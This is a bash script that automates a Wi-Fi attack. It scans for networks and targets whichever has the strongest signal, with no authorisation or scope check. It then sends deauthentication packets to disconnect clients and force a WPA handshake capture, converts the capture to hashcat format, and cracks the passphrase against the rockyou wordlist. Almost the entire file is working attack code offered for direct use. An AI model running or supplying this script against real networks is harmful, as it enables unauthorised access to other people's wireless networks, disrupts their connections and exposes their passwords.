#!/bin/bash

# ============ CONFIGURATION ============
IFACE="wlan0mon"
CAPTURE_DIR="auto_capture"
WORDLIST="/usr/share/wordlists/rockyou.txt"
CRACK_TIMEOUT=0   # 0 = unlimited; > 0 = seconds to run Hashcat
# =======================================

echo "[*] Starting automated Wi-Fi attack..."

# Step 1: Scan networks
echo "[*] Scanning for networks (10s)..."
timeout 10s airodump-ng $IFACE --write scan --output-format csv >/dev/null 2>&1

if [ ! -f scan-01.csv ]; then
    echo "[!] Scan failed or no networks found."
    exit 1
fi

# Step 2: Get strongest signal network
TARGET_LINE=$(awk -F',' '/^BSSID/ {found=1; next} /^Station/ {exit} found && $14 != "" && $4 != "" {print $0}' scan-01.csv | sort -t',' -k4 -nr | head -n 1)

if [ -z "$TARGET_LINE" ]; then
    echo "[!] No valid networks found."
    exit 1
fi

BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1)
CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
ESSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | sed 's/^ *//;s/ *$//')

echo "[*] Targeting ESSID: $ESSID | BSSID: $BSSID | Channel: $CHANNEL"

# Step 3: Prepare environment
mkdir -p "$CAPTURE_DIR"
cd "$CAPTURE_DIR"

# Step 4: Start capture
echo "[*] Starting airodump-ng to capture handshake..."
xterm -hold -e "airodump-ng --bssid $BSSID -c $CHANNEL -w capture $IFACE" &
AIRDUMP_PID=$!

sleep 10

# Step 5: Deauth to force handshake
echo "[*] Sending deauth packets..."
aireplay-ng --deauth 20 -a "$BSSID" "$IFACE" >/dev/null 2>&1

sleep 10

# Step 6: Kill capture
kill $AIRDUMP_PID

# Step 7: Convert to Hashcat format
echo "[*] Converting to .hc22000 format..."
hcxpcapngtool -o handshake.hc22000 capture-01.cap >/dev/null 2>&1

if [ ! -f handshake.hc22000 ]; then
    echo "[!] Failed to convert capture to hash."
    exit 1
fi

# Step 8: Crack using Hashcat
echo "[*] Cracking with Hashcat..."

if [ "$CRACK_TIMEOUT" -gt 0 ]; then
    timeout "$CRACK_TIMEOUT"s hashcat -m 22000 -a 0 handshake.hc22000 "$WORDLIST"
else
    hashcat -m 22000 -a 0 handshake.hc22000 "$WORDLIST"
fi

# Step 9: Show result
echo "[*] Crack results:"
hashcat -m 22000 -a 0 handshake.hc22000 "$WORDLIST" --show

